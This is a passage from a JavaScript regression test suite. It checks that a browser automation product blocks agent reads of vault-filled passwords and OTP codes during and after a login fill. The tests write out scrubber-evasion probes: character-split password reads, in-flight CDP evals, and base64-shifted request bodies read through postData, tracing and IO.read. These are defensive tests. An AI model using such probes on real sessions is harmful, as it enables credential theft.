        && Boolean(medEvalMid.error && /login_fill_live/.test(medEvalMid.error.message || ''))
        && exfilOut.action === 'fail'
        && safeAfterCeiling,
      kind,
      mode,
      readMidStatus: readMid.status,
      medEvalErr: medEvalMid.error?.message || null,
      exfilAction: exfilOut.action,
      valStillOnPage,
      readAfterWipeStatus: readAfterWipe.status,
      readAfterWipeCode: readAfterWipe.json?.code || null,
    };
  } finally {
    try { dialogs1?.shutdown(); } catch { /* */ }
    try { dialogs2?.shutdown(); } catch { /* */ }
    try { vault1?.close(); } catch { /* */ }
    try { vault2?.close(); } catch { /* */ }
    if (srv) await new Promise((r) => srv.close(() => r()));
    try { await mediator?.shutdown(); } catch { /* */ }
    if (ownFk) { try { await fk?.close(); } catch { /* */ } }
    if (ownTmp) fs.rmSync(tmpRoot, { recursive: true, force: true });
  }
}

function spawnFirstFillChild(repoDir, kind, mode) {
  return new Promise((resolve) => {
    const tmpXdg = fs.mkdtempSync(path.join(os.tmpdir(), 'vs-r28-xdg-'));
    const child = spawn(
      process.execPath,
      [SELF_PATH, `--repo=${repoDir}`, `--first-fill-worker=${kind}`, `--worker-mode=${mode}`],
      { env: { ...process.env, XDG_RUNTIME_DIR: tmpXdg, VIBESPACE_SKIP_AGENT_HOOKS: '1' } },
    );
    let out = '', err = '';
    child.stdout.on('data', (d) => { out += d; });
    child.stderr.on('data', (d) => { err += d; });
    child.on('close', (code) => {
      fs.rmSync(tmpXdg, { recursive: true, force: true });
      let parsed = null;
      try { parsed = JSON.parse(out.trim().split('\n').pop() || '{}'); } catch { parsed = { ok: false, rawOut: out, rawErr: err, code }; }
      resolve({ exitCode: code, ...parsed });
    });
  });
}

export async function runR28LoginNails({ repoDir, ok, MUT = null }) {
  const req = createRequire(path.join(repoDir, 'package.json'));
  const express = req('express');
  const { WebSocket } = req('ws');
  const { Auth } = req('./src/auth.js');
  const BL = req('./src/browser-login.js');
  const BM = req('./src/browser-mediation.js');
  const VE = req('./src/server/vault-engine.js');
  const GS = req('./src/server/grants-store.js');
  const BK = req('./src/server/browser-keeper.js');
  const Lm = req('./src/server/browser-logins.js');
  const Dm = withCurrentTab(req('./src/server/browser-dialogs.js')); // B-21cc: each watch's keeper answers its current tab
  const LF = (() => { try { return req('./src/server/browser-login-fill.js'); } catch { return null; } })();
  const CM = req('./src/server/cdp-mediator.js');
  const AE = req('./src/server/automation-engine.js');
  const Rm = req('./src/routes/browser.js');
  const { startFakeKernel } = await import(pathToFileURL(path.join(repoDir, 'scripts/fixtures/fake-kernel.mjs')).href);

  console.log('⑧ Round 28 regression nails: full-window fence, W0 in-flight abort (0 terminateExecution), pre-planted timer events, postData/trace/HAR during+after fill, protocol fault fail-closed + SPA ref guard + generate rollback, Property 4 (4-1 / 4-2 / 3 fresh-process first fills)');

  const r28ChildrenPromise = Promise.all([
    spawnFirstFillChild(repoDir, 'long', 'same-proc-lock'),
    spawnFirstFillChild(repoDir, 'short', 'same-proc-lock'),
    spawnFirstFillChild(repoDir, 'otp', 'same-proc-lock'),
    runColdLockedPair(repoDir, 'long'),
    runColdLockedPair(repoDir, 'short'),
    runColdLockedPair(repoDir, 'otp'),
    runColdLockedPair(repoDir, 'short', { control: true }),   // r2913: the RED CONTROL (the race, placed)
  ]);

  const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'vs-r28-nails-'));
  const dataDir = path.join(tmpRoot, 'data');
  fs.mkdirSync(dataDir, { recursive: true, mode: 0o700 });

  const ORIGIN = 'https://shop.example.test';
  const PW_ALICE = 'R28AlicePw!9472_Zeta';
  const OTP_VAL = '482910'; // 6 bytes (< MIN_MASK_BYTES = 8)

  let fk = null;
  let relay = null;
  let mediator = null;
  let dialogs = null;
  let vault = null;
  let srv = null;

  try {
    fk = await startFakeKernel({
      firstUrl: `${ORIGIN}/login`,
      mode: { standard: true, omitFilledPassword: true },
    });
    relay = await startKernelRelay(fk);
    const mainTid = fk.targets()[0].targetId;
    const resetDom = (url = `${ORIGIN}/login`, pwType = 'password') => {
      fk.setDom(mainTid, {
        url,
        elements: [
          { id: 'u', tag: 'input', type: 'email', name: 'Username' },
          { id: 'pw', tag: 'input', type: pwType, name: 'Password' },
          { id: 'otp', tag: 'input', type: 'text', name: 'Verification code' },
        ],
      });
    };
    resetDom();

    let clock = 1_760_100_000_000;
    const auth = new Auth(dataDir);
    auth.setPassword('OwnerSign!2026', { userSet: true });
    vault = VE.create({
      dataDir,
      kdf: { N: 1024, r: 8, p: 1 },
      signInPassword: (pw) => auth.verifyPassword(pw),
      idleTimer: false,
      signals: false,
      now: () => clock,
      log: quiet,
    });
    await vault.setup('VaultR28#SecondPw');
    const grants = GS.create({ dataDir, wss: { clients: new Set() }, log: quiet.log });
    vault.secretPut('totp:shop-2fa', 'JBSWY3DPEHPK3PXP');

    const fyItems = new Map();
    let fySeq = 0;
    const forYou = {
      add(_pid, item) {
        const id = `fy-r28-${++fySeq}`;
        fyItems.set(id, { id, status: 'open', ...item });
        return id;
      },
      resolve(id) { const it = fyItems.get(id); if (it) it.status = 'done'; },
      openCount() { return [...fyItems.values()].filter((x) => x.status === 'open').length; },
    };

    const logins = Lm.create({
      vault,
      grants: () => grants,
      totpCode: (name) => (name === 'shop-2fa' ? { ok: true, code: OTP_VAL } : { ok: false, code: 'no_totp' }),
      forYou,
      now: () => clock,
      log: quiet.log,
    });
    logins.addOwn({ origin: ORIGIN, username: 'alice', password: PW_ALICE, totpName: 'shop-2fa' }, { who: 'owner' });
    const CONV_ID = 'conv-r28-1';
    grants.set('browser-login', `${ORIGIN}#*`, { to: [{ kind: 'conversation', key: CONV_ID }], except: [] });

    // Mint automation key (`vsak_`)
    const automation = AE.create({
      dataDir,
      vault,
      grants,
      userTodos: { add: () => ({ id: 'td-1' }), get: () => null, setStatus: () => null },
      log: quiet.log,
      verbs: { 'feedback.list': async () => ({ ok: true, reports: [] }) },
    });
    const akMint = automation.mint({ name: 'r28-ak', scopes: ['feedback.list'], by: 'owner' });
    const VSAK_TOKEN = vault.secretGet(`apikey:${akMint.key.id}`).value.toString('utf8');

    const keeperReal = BK.create({
      rootDir: dataDir,
      dataDir,
      profilesRoot: path.join(dataDir, 'profiles'),
      runtimeRoot: path.join(dataDir, 'run'),
      log: quiet,
      launchImpl: async () => { throw new Error('no launch'); },
    });
    const prof = keeperReal.createProfile({ label: 'R28Profile' }, { owner: { kind: 'instance', id: null } });
    const PID = prof.id;
    const KEY = 'bk-0000c281';
    const JOB_HANDLE = `${KEY}.1`;
    const JOB_ID = 'job-r28-1';
    const SID = 'sess-r28-1';
    const VSST_TOKEN = 'vsst_' + crypto.randomBytes(16).toString('hex');
    const JBT_TOKEN = 'jbt_' + crypto.randomBytes(16).toString('hex');

    mediator = CM.create({ log: quiet });
    await mediator.listen();
    const medGrantSess = await mediator.grantFor({
      profileId: PID,
      browserKey: KEY,
      upstream: relay.wsUrl,
      targetIds: [mainTid],
      mode: 'scope',
    });
    const medGrantJob = await mediator.grantFor({
      profileId: PID,
      browserKey: JOB_HANDLE,
      upstream: relay.wsUrl,
      targetIds: [mainTid],
      mode: 'scope',
    });

    const keeper = {
      clock: () => clock,
      list: () => ({
        profiles: [prof],
        leases: [
          { profileId: PID, browserKey: KEY, sessionId: SID, targetId: mainTid },
          { profileId: PID, browserKey: JOB_HANDLE, sessionId: SID, targetId: mainTid },
        ],
        pins: { [KEY]: PID },
        children: { [JOB_HANDLE]: { parent: KEY, job: JOB_ID } },
      }),
      profile: (id) => (id === PID ? prof : null),
      profileByRef: (r) => (r === PID || r === 'r28' ? prof : null),
      resolveFor: ({ browserKey }) => ({
        ok: true,
        kind: 'attachment',
        handle: 'r28',
        attachment: { profileId: PID, alias: 'r28', isDefault: true },
        handles: [{ handle: 'r28', kind: 'attachment', profileId: PID, isDefault: true }],
        isDefault: true,
        browserKey,
      }),
      attach: async ({ browserKey }) => {
        const g = browserKey === JOB_HANDLE ? medGrantJob : medGrantSess;
        return {
          ok: true,
          profile: prof,
          browser: { profileId: PID, state: 'running' },
          lease: { profileId: PID, browserKey: browserKey || KEY, sessionId: SID, since: clock },
          cdpUrl: g.url,
          env: [`AGENT_BROWSER_CDP=${g.httpBase}`],
        };
      },
      jobHandleFor: () => JOB_HANDLE,
      findJobHandle: () => JOB_HANDLE,
      statusFor: () => ({ ephemeral: null, pin: PID, leases: [{ profileId: PID, alias: 'r28', isDefault: true }] }),
      setFor: () => ({
        defaultId: PID,
        attachments: [{ profileId: PID, alias: 'r28', label: 'R28Profile', isDefault: true }],
        handles: [{ handle: 'r28', kind: 'attachment', profileId: PID, isDefault: true }],
      }),
      leasesFor: (bk) => (bk === JOB_HANDLE
        ? [{ profileId: PID, browserKey: JOB_HANDLE, sessionId: SID, targetId: mainTid }]
        : [{ profileId: PID, browserKey: KEY, sessionId: SID, targetId: mainTid }]),
      inputStateFor: () => ({ input: 'agent', takenAt: 0 }),
      ephemeralFor: () => null,
      audit() {},
      tell() {},
      bootstrapTabRoot: async () => {},
      noteLeaseUrl() {},
      onLease: () => () => {},
      socketRootOf: () => ({ socketDir: path.join(tmpRoot, 'sock'), runtimeDir: tmpRoot }),
      configFileFor: () => null,
      cdpEndpointFor: async (id) => (id === PID ? { ok: true, url: relay.wsUrl } : { ok: false }),
      cdpEndpointOf: async (id) => (id === PID ? { ok: true, url: relay.wsUrl, wsUrl: relay.wsUrl, port: relay.port } : { ok: false }),
      mediator: () => mediator,
      saveLoginFenceState: (id, st) => keeperReal.saveLoginFenceState(id, st),
      // r2913: the real keeper's landing wait, carried — the fill types only once the tab's fence record is on disk, as in the product
      whenLanded: (o) => keeperReal.whenLanded(o),
      loginFenceStateOf: (id) => keeperReal.loginFenceStateOf(id),
      loginChannelFor: ({ ephemeral = false, remoteSession = false, action = 'fill' } = {}) => BM.loginFillChannelVerdict(
        BM.leaseRoadVerdict({ mediated: false, proxy: Boolean(mediator), ephemeral: Boolean(ephemeral), remoteSession: Boolean(remoteSession), agent: true }),
        { proxy: Boolean(mediator), external: false, remote: false, remoteSession: Boolean(remoteSession), hasCdp: Boolean(relay.wsUrl), usableProfiles: [prof.label], profileLabel: prof.label, action },
      ),
    };

    dialogs = Dm.create({
      keeper,
      logins,
      now: () => clock,
      enableTimeoutMs: 250,
      callTimeoutMs: 120,
      interceptTimeoutMs: 85,
      rearmMs: 40,
      holdersOf: () => [
        { browserKey: KEY, sessionId: SID },
        { browserKey: JOB_HANDLE, sessionId: SID },
      ],
      leaseCountOf: () => 1,
      labelOf: () => 'R28Profile',
      takeoverOf: () => false,
      conversationOf: () => ({ cid: CONV_ID, name: 'R28 Agent' }),
      isVaultLocked: () => vault.state() !== 'unlocked',
      log: quiet,
    });
    vault.onLock(() => { try { dialogs.onVaultLock?.(); } catch { /* optional */ } });

    const sessions = new Map([[SID, {
      agentToken: VSST_TOKEN,
      _webuiId: SID,
      backend: 'claude',
      _browserKey: KEY,
      _browserVariant: 'D',
      _browserProfileId: PID,
      name: 'R28 Agent',
      webuiName: 'R28 Agent',
      cwd: tmpRoot,
      claudeSessionId: CONV_ID,
      backendSessionId: CONV_ID,
    }]]);
    const jobsEngine = {
      ready: true,
      jobByToken: (tok) => (tok === JBT_TOKEN ? {
        id: JOB_ID,
        name: 'R28 Job',
        state: 'up',
        owner: { conversation: { id: CONV_ID } },
      } : null),
    };
    Rm.setup({
      keeper,
      activeSessions: sessions,
      dialogs,
      logins,
      getJobs: () => jobsEngine,
      tasksForSession: () => [],
    });

    const app = express();
    app.use(express.json());
    app.use(Rm.router);
    srv = http.createServer(app);
    await new Promise((r) => srv.listen(0, '127.0.0.1', r));
    const API = `http://127.0.0.1:${srv.address().port}`;
    const post = async (u, body, tok = VSST_TOKEN) => {
      const r = await fetch(API + u, {
        method: 'POST',
        headers: { 'content-type': 'application/json', authorization: `Bearer ${tok}` },
        body: JSON.stringify(body),
      });
      let json = null;
      const text = await r.text();
      try { json = JSON.parse(text); } catch { json = null; }
      return { status: r.status, json, text };
    };

    await dialogs.arm(PID);
    dialogs.bindTab?.({ profileId: PID, browserKey: KEY }, mainTid);
    dialogs.bindTab?.({ profileId: PID, browserKey: JOB_HANDLE }, mainTid);
    dialogs.noteActiveTab?.({ profileId: PID, browserKey: KEY }, mainTid);
    dialogs.noteActiveTab?.({ profileId: PID, browserKey: JOB_HANDLE }, mainTid);

    const clearTabFenceByNav = async (url = `${ORIGIN}/login`) => {
      fk.navigate(mainTid, `${ORIGIN}/logout`);
      await new Promise((r) => setTimeout(r, 30));
      fk.navigate(mainTid, url);
      await new Promise((r) => setTimeout(r, 30));
      resetDom(url);
    };

    // ── R28-1a: Rule 1 + Rule 3 — Full-window read fence from the instant `fillVaultField` enters the tab ──
    {
      const medPre = await openMediatedCdpSession(WebSocket, medGrantSess.url, mainTid);
      let enteredResolve = null;
      const entered = new Promise((r) => { enteredResolve = r; });
      let releaseFrameTree = null;
      const holdFrameTree = new Promise((r) => { releaseFrameTree = r; });
      let pausedOnce = false;
      relay.state.hook = async (m) => {
        if (!pausedOnce && m.method === 'Page.getFrameTree') {
          pausedOnce = true;
          enteredResolve();
          await holdFrameTree;
        }
        return false;
      };

      const fillFlight = post('/api/agent/browser/fill-vault', {
        profile: PID,
        target: '#otp',
        spec: 'shop.example.test#alice/otp',
        targetId: mainTid,
      });
      await entered; // Paused BEFORE `onBeforeInsert` / `Input.insertText`!

      const rVsst = await post('/api/agent/browser/resolve', { wrapper: true, argv: ['eval', 'document.querySelector("#otp").value'], targetId: mainTid }, VSST_TOKEN);
      const rJbt = await post('/api/agent/browser/resolve', { wrapper: true, argv: ['get', 'value', '#otp'], targetId: mainTid }, JBT_TOKEN);
      const rVsak = await post('/api/agent/browser/resolve', { wrapper: true, argv: ['eval', '1'], targetId: mainTid }, VSAK_TOKEN);
      const rDirect = await post('/api/agent/browser/direct', { profile: PID, action: 'screenshot' }, VSST_TOKEN);
      const cdpEval = await medPre.call('Runtime.evaluate', { expression: '1+1', returnByValue: true }, medPre.sid);
      const cdpShot = await medPre.call('Page.captureScreenshot', {}, medPre.sid);
      const cdpNested = await medPre.call('Target.sendMessageToTarget', { sessionId: medPre.sid, message: JSON.stringify({ id: 1, method: 'Runtime.evaluate', params: { expression: '1' } }) });

      releaseFrameTree();
      const fillDone = await fillFlight;
      relay.state.hook = null;
      medPre.close();

      ok(
        rVsst.status === 409 && rVsst.json?.code === 'login_fill_live' && /submit|navigation|finish/i.test(String(rVsst.json?.error || ''))
          && rJbt.status === 409 && rJbt.json?.code === 'login_fill_live'
          && (rVsak.status === 401 || rVsak.status === 403 || (rVsak.status === 409 && rVsak.json?.code === 'login_fill_live'))
          && rDirect.status === 409 && rDirect.json?.code === 'login_fill_live'
          && Boolean(cdpEval.error && /login_fill_live/.test(cdpEval.error.message || '') && /submit|navigation|finish/i.test(cdpEval.error.message || ''))
          && Boolean(cdpShot.error && /login_fill_live/.test(cdpShot.error.message || ''))
          && Boolean(cdpNested.error)
          && fillDone.status === 200,
        'R28-1a (Rule 1 + Rule 3): pre-insert active fill refuses vsst_/jbt_ /resolve, vsak_, /direct screenshot, and inbound mediated CDP (Runtime.evaluate, Page.captureScreenshot, Target.sendMessageToTarget) with 409 login_fill_live and wait-for-submit guidance',
        { rVsst: rVsst.status, rVsstErr: rVsst.json?.error, rJbt: rJbt.status, rVsak: rVsak.status, rDirect: rDirect.status, cdpEvalErr: cdpEval.error, cdpShotErr: cdpShot.error, cdpNestedErr: cdpNested.error, fillDone: fillDone.status },
      );
      await clearTabFenceByNav();
    }

    // ── R28-1b: Point 1 clean recovery — Failed fill with no value on page clears fence immediately ──
    {
      // Case 1: Pre-insert failure (`target_not_found`)
      const preFail = await post('/api/agent/browser/fill-vault', {
        profile: PID,
        target: '#missing-field',
        spec: 'shop.example.test#alice/password',
        targetId: mainTid,
      });
      const readAfterPreFail = await post('/api/agent/browser/resolve', { wrapper: true, argv: ['eval', '1+1'], targetId: mainTid });

      // Case 2: Post-`onBeforeInsert` `Input.insertText` CDP error (`verifiedEmpty === true`, 0 cred requests)
      let faultedInsert = false;
      relay.state.hook = async (m, { sendToClient }) => {
        if (!faultedInsert && m.method === 'Input.insertText') {
          faultedInsert = true;
          sendToClient({ id: m.id, ...(m.sessionId ? { sessionId: m.sessionId } : {}), error: { code: -32000, message: 'Input dispatch failed' } });
          return true;
        }
        return false;
      };
      const insFail = await post('/api/agent/browser/fill-vault', {
        profile: PID,
        target: '#pw',
        spec: 'shop.example.test#alice/password',
        targetId: mainTid,
      });
      relay.state.hook = null;
      const domAfterInsFail = fk.readDomValues(mainTid);
      const readAfterInsFail = await post('/api/agent/browser/resolve', { wrapper: true, argv: ['eval', '1+1'], targetId: mainTid });
      const medAfterFail = await openMediatedCdpSession(WebSocket, medGrantSess.url, mainTid);
      const cdpAfterFail = await medAfterFail.call('Runtime.evaluate', { expression: 'location.href', returnByValue: true }, medAfterFail.sid);
      medAfterFail.close();

      ok(
        preFail.status === 409 && preFail.json?.code === 'target_not_found'
          && readAfterPreFail.status === 200
          && insFail.status === 409 && domAfterInsFail.pw === ''
          && dialogs.liveFillOnTarget(PID, mainTid) === null
          && readAfterInsFail.status === 200
          && !cdpAfterFail.error && typeof cdpAfterFail.result?.result?.value === 'string',
        'R28-1b (Point 1 recovery): failed fill with no value left on page (both pre-insert target_not_found and post-onBeforeInsert Input.insertText CDP error) clears fence immediately so tab remains readable (HTTP 200)',
        { preFail: preFail.status, readAfterPreFail: readAfterPreFail.status, insFail: insFail.status, domAfterInsFail, readAfterInsFail: readAfterInsFail.status, cdpAfterFail },
      );
      await clearTabFenceByNav();
    }

    // ── R28-2: Rule 2 — Pre-fill (`W0`) in-flight mediated CDP `awaitPromise` reads aborted + ZERO `Runtime.terminateExecution` + login page's own script undisturbed ──
    {
      const w0Resolve = await post('/api/agent/browser/resolve', { wrapper: true, argv: ['eval', '1'], targetId: mainTid }, VSST_TOKEN);
      const w0ResolveJbt = await post('/api/agent/browser/resolve', { wrapper: true, argv: ['eval', '1'], targetId: mainTid }, JBT_TOKEN);
      const medOtp = await openMediatedCdpSession(WebSocket, w0Resolve.json.cdpUrl, mainTid);
      const medPw = await openMediatedCdpSession(WebSocket, w0ResolveJbt.json.cdpUrl, mainTid);

      const cwOtp = await medOtp.call('Page.createIsolatedWorld', { frameId: mainTid, worldName: 'w0-otp' }, medOtp.sid);
      const cwPw = await medPw.call('Page.createIsolatedWorld', { frameId: mainTid, worldName: 'w0-pw' }, medPw.sid);

      // Start login page's own background timer inside the page's isolated world to verify it is NOT killed!
      const cwPageOwn = await medOtp.call('Page.createIsolatedWorld', { frameId: mainTid, worldName: 'page-own-script' }, medOtp.sid);
      await medOtp.call('Runtime.evaluate', {
        contextId: cwPageOwn.result.executionContextId,
        expression: 'globalThis.__pageOwnTimerDone = false; setTimeout(() => { globalThis.__pageOwnTimerDone = "completed-undisturbed"; }, 45); "armed"',
        returnByValue: true,
      }, medOtp.sid);

      const callsBefore = relay.state.upstreamCalls.length;

      // Launch TWO in-flight `awaitPromise: true` reads BEFORE `fill-vault` starts (`W0`):
      //   1) 6-digit `#otp` (< 8 bytes, never in scrubber)
      //   2) char-split `Array.from(#pw.value).join(':')` (bypasses contiguous substring scrubber)
      const inFlightOtp = medOtp.call('Runtime.evaluate', {
        contextId: cwOtp.result.executionContextId,
        expression: 'new Promise((r) => setTimeout(() => r(document.querySelector("#otp").value), 60))',
        returnByValue: true,
        awaitPromise: true,
      }, medOtp.sid);
      const inFlightPw = medPw.call('Runtime.evaluate', {
        contextId: cwPw.result.executionContextId,
        expression: 'new Promise((r) => setTimeout(() => r(Array.from(document.querySelector("#pw").value).join(":")), 60))',
        returnByValue: true,
        awaitPromise: true,
      }, medPw.sid);

      await new Promise((r) => setTimeout(r, 15)); // Ensure both `Runtime.evaluate` calls are parked upstream!

      const fillOtp = await post('/api/agent/browser/fill-vault', { profile: PID, target: '#otp', spec: 'shop.example.test#alice/otp', targetId: mainTid }, VSST_TOKEN);
      const fillPw = await post('/api/agent/browser/fill-vault', { profile: PID, target: '#pw', spec: 'shop.example.test#alice/password', targetId: mainTid }, JBT_TOKEN);

      const [otpReply, pwReply] = await Promise.all([inFlightOtp, inFlightPw]);
      await new Promise((r) => setTimeout(r, 65)); // Let late upstream replies settle & page's own timer finish

      const terminateCalls = relay.state.upstreamCalls
        .slice(callsBefore)
        .filter((c) => c.method === 'Runtime.terminateExecution').length;

      // Wipe via same-origin submit + check that `page-own-script` timer completed undisturbed without `terminateExecution`!
      // Check directly on upstream `fk` socket so we observe the page context before navigating away:
      const rawCheckWs = new WebSocket(fk.wsUrl);
      await new Promise((r) => rawCheckWs.once('open', r));
      const rawCall = (id, method, params, sessionId) => new Promise((r) => {
        const onMsg = (d) => {
          const m = JSON.parse(String(d));
          if (m.id === id) { rawCheckWs.off('message', onMsg); r(m); }
        };
        rawCheckWs.on('message', onMsg);
        rawCheckWs.send(JSON.stringify({ id, method, params, ...(sessionId ? { sessionId } : {}) }));
      });
      const rawAtt = await rawCall(1, 'Target.attachToTarget', { targetId: mainTid, flatten: true });
      const pageOwnCheck = await rawCall(2, 'Runtime.evaluate', {
        contextId: cwPageOwn.result.executionContextId,
        expression: 'globalThis.__pageOwnTimerDone',
        returnByValue: true,
      }, rawAtt.result.sessionId);
      rawCheckWs.close();

      medOtp.close();
      medPw.close();

      const otpText = JSON.stringify(otpReply);
      const pwText = JSON.stringify(pwReply);
      const splitPw = Array.from(PW_ALICE).join(':');
      ok(
        fillOtp.status === 200 && fillPw.status === 200
          && Boolean(otpReply.error && /login_fill_live/.test(otpReply.error.message || ''))
          && Boolean(pwReply.error && /login_fill_live/.test(pwReply.error.message || ''))
          && !otpText.includes(OTP_VAL)
          && !pwText.includes(PW_ALICE) && !pwText.includes(splitPw)
          && terminateCalls === 0
          && pageOwnCheck.result?.result?.value === 'completed-undisturbed',
        'R28-2 (Rule 2): W0 pre-fill in-flight awaitPromise reads of 6-digit OTP and char-split password both abort with login_fill_live (0 secret chars), send 0 Runtime.terminateExecution upstream, and leave the login page\'s own timer undisturbed',
        { otpReply, pwReply, terminateCalls, pageOwnVal: pageOwnCheck.result?.result?.value },
      );
      await clearTabFenceByNav();
    }

    // ── R28-3: Point 3 — Pre-planted page timer emitting console / exception / log / audit events while secret is on page ──
    {
      const medEv = await openMediatedCdpSession(WebSocket, medGrantSess.url, mainTid);
      await medEv.call('Runtime.enable', {}, medEv.sid);
      await medEv.call('Page.enable', {}, medEv.sid);

      const fillOtp = await post('/api/agent/browser/fill-vault', { profile: PID, target: '#otp', spec: 'shop.example.test#alice/otp', targetId: mainTid });
      const fillPw = await post('/api/agent/browser/fill-vault', { profile: PID, target: '#pw', spec: 'shop.example.test#alice/password', targetId: mainTid });
      medEv.events.length = 0;

      const splitPw = Array.from(PW_ALICE).join(':');
      relay.emitTargetEvent(mainTid, 'Runtime.consoleAPICalled', {
        type: 'log',
        args: [{ type: 'string', value: `otp=${OTP_VAL} pw=${splitPw}` }],
      });
      relay.emitTargetEvent(mainTid, 'Runtime.exceptionThrown', {
        exceptionDetails: { text: `Uncaught otp=${OTP_VAL} pw=${splitPw}` },
      });
      relay.emitTargetEvent(mainTid, 'Log.entryAdded', {
        entry: { source: 'javascript', level: 'info', text: `log otp=${OTP_VAL}` },
      });
      relay.emitTargetEvent(mainTid, 'Audits.issueAdded', {
        issue: { code: 'GenericIssue', details: { raw: OTP_VAL } },
      });
      await new Promise((r) => setTimeout(r, 60));

      const evDump = JSON.stringify(medEv.events);
      const rConsole = await post('/api/agent/browser/resolve', { wrapper: true, argv: ['console'], targetId: mainTid });
      const rStorage = await post('/api/agent/browser/resolve', { wrapper: true, argv: ['storage', 'local'], targetId: mainTid });
      const rCookies = await post('/api/agent/browser/resolve', { wrapper: true, argv: ['cookies'], targetId: mainTid });
      medEv.close();

      ok(
        fillOtp.status === 200 && fillPw.status === 200
          && !evDump.includes(OTP_VAL) && !evDump.includes(PW_ALICE) && !evDump.includes(splitPw)
          && medEv.events.filter((e) => ['Runtime.consoleAPICalled', 'Runtime.exceptionThrown', 'Log.entryAdded', 'Audits.issueAdded'].includes(e.method)).length === 0
          && rConsole.status === 409 && rConsole.json?.code === 'login_fill_live'
          && rStorage.status === 409 && rStorage.json?.code === 'login_fill_live'
          && rCookies.status === 409 && rCookies.json?.code === 'login_fill_live',
        'R28-3 (Point 3): while secret is on page, pre-planted timer output via Runtime.consoleAPICalled / exceptionThrown / Log.entryAdded / Audits.issueAdded is dropped (0 events) and console/storage/cookies read verbs refuse 409 login_fill_live',
        { receivedEvents: medEv.events, rConsole: rConsole.status, rStorage: rStorage.status, rCookies: rCookies.status },
      );
      await clearTabFenceByNav();
    }

    // ── R28-4: Point 4 — Submit-time credential request body in agent's CDP session (DURING fill AND AFTER fill lifts fence) ──
    {
      const medNet = await openMediatedCdpSession(WebSocket, medGrantSess.url, mainTid);
      await medNet.call('Network.enable', {}, medNet.sid);
      await medNet.call('Fetch.enable', { patterns: [{ urlPattern: '*' }] }, medNet.sid);
      // Start Tracing BEFORE fill (so mediator must taint active trace when fill starts!)
      let traceActiveUpstream = false;
      relay.state.hook = async (m, { sendToClient }) => {
        if (m.method === 'Tracing.start') {
          traceActiveUpstream = true;
          sendToClient({ id: m.id, ...(m.sessionId ? { sessionId: m.sessionId } : {}), result: {} });
          return true;
        }
        if (m.method === 'Tracing.end') {
          traceActiveUpstream = false;
          sendToClient({ method: 'Tracing.dataCollected', params: { value: [{ name: 'ResourceSendRequest', args: { data: { postData: `otp=${OTP_VAL}&pw=${PW_ALICE}` } } }] } });
          sendToClient({ method: 'Tracing.tracingComplete', params: { dataLossOccurred: false, stream: 'trace-stream-1' } });
          sendToClient({ id: m.id, ...(m.sessionId ? { sessionId: m.sessionId } : {}), result: {} });
          return true;
        }
        if (m.method === 'IO.read' && m.params?.handle === 'trace-stream-1') {
          sendToClient({ id: m.id, ...(m.sessionId ? { sessionId: m.sessionId } : {}), result: { data: `otp=${OTP_VAL}&pw=${PW_ALICE}`, eof: true } });
          return true;
        }
        if (m.method === 'Network.getRequestPostData' || m.method === 'Fetch.getRequestPostData') {
          sendToClient({ id: m.id, ...(m.sessionId ? { sessionId: m.sessionId } : {}), result: { postData: `otp=${OTP_VAL}&pw=${PW_ALICE}` } });
          return true;
        }
        if (m.method === 'Network.replayXHR') {
          sendToClient({ id: m.id, ...(m.sessionId ? { sessionId: m.sessionId } : {}), result: {} });
          return true;
        }
        return false;
      };

      const traceStartBefore = await medNet.call('Tracing.start', {});
      await post('/api/agent/browser/fill-vault', { profile: PID, target: '#pw', spec: 'shop.example.test#alice/password', targetId: mainTid });
      await post('/api/agent/browser/fill-vault', { profile: PID, target: '#otp', spec: 'shop.example.test#alice/otp', targetId: mainTid });
      medNet.events.length = 0;

      // Shifted prefix `x=1&` so base64 encoding of `postDataEntries[0].bytes` does NOT contain `btoa(OTP_VAL)` or `btoa(PW_ALICE)` at byte-0 alignment!
      const rawBody = `x=1&otp=${OTP_VAL}&pw=${encodeURIComponent(PW_ALICE)}`;
      const shiftedB64 = Buffer.from(rawBody, 'utf8').toString('base64');

      // 1) DURING FILL: emit Network.requestWillBeSent, Fetch.requestPaused, Network.requestWillBeSentExtraInfo + test Tracing.start refusal
      const traceStartDuring = await medNet.call('Tracing.start', {});
      relay.emitTargetEvent(mainTid, 'Network.requestWillBeSent', {
        requestId: 'req-submit-during',
        request: {
          url: `${ORIGIN}/api/login`,
          method: 'POST',
          headers: { 'content-type': 'application/x-www-form-urlencoded' },
          hasPostData: true,
          postData: rawBody,
          postDataEntries: [{ bytes: shiftedB64 }],
        },
        type: 'XHR',
      });
      relay.emitTargetEvent(mainTid, 'Fetch.requestPaused', {
        requestId: 'fetch-submit-during',
        networkId: 'req-submit-during',
        request: {
          url: `${ORIGIN}/api/login`,
          method: 'POST',
          headers: {},
          hasPostData: true,
          postData: rawBody,
          postDataEntries: [{ bytes: shiftedB64 }],
        },
        frameId: mainTid,
        resourceType: 'XHR',
      });
      relay.emitTargetEvent(mainTid, 'Network.requestWillBeSentExtraInfo', {
        requestId: 'req-submit-during',
        associatedCookies: [],
        headers: { authorization: `Bearer ${OTP_VAL}`, cookie: `pw=${PW_ALICE}` },
      });
      await new Promise((r) => setTimeout(r, 50));

      // 2) Navigate to `/dashboard` so the submit navigation LIFTS `liveFill` (`liveFillOnTarget === null`)!
      fk.navigate(mainTid, `${ORIGIN}/dashboard`);
      await new Promise((r) => setTimeout(r, 50));
      const fenceLifted = dialogs.liveFillOnTarget(PID, mainTid) === null;

      // 3) AFTER FILL (fence is lifted!): late/post-submit `Network.requestWillBeSent` + `Network.getRequestPostData` + `Fetch.getRequestPostData` + `Network.replayXHR` + `Tracing.end` + `IO.read`
      relay.emitTargetEvent(mainTid, 'Network.requestWillBeSent', {
        requestId: 'req-submit-after',
        request: {
          url: `${ORIGIN}/session/finalize`,
          method: 'POST',
          headers: { 'content-type': 'application/x-www-form-urlencoded' },
          hasPostData: true,
          postData: rawBody,
          postDataEntries: [{ bytes: shiftedB64 }],
        },
        type: 'Document',
      });
      await new Promise((r) => setTimeout(r, 40));

      const netPostDuringId = await medNet.call('Network.getRequestPostData', { requestId: 'req-submit-during' }, medNet.sid);
      const netPostAfterId = await medNet.call('Network.getRequestPostData', { requestId: 'req-submit-after' }, medNet.sid);
      const netPostUnknownId = await medNet.call('Network.getRequestPostData', { requestId: 'req-unseen-99' }, medNet.sid);
      const fetchPostAfter = await medNet.call('Fetch.getRequestPostData', { requestId: 'fetch-submit-during' }, medNet.sid);
      const replayAfter = await medNet.call('Network.replayXHR', { requestId: 'req-submit-during' }, medNet.sid);
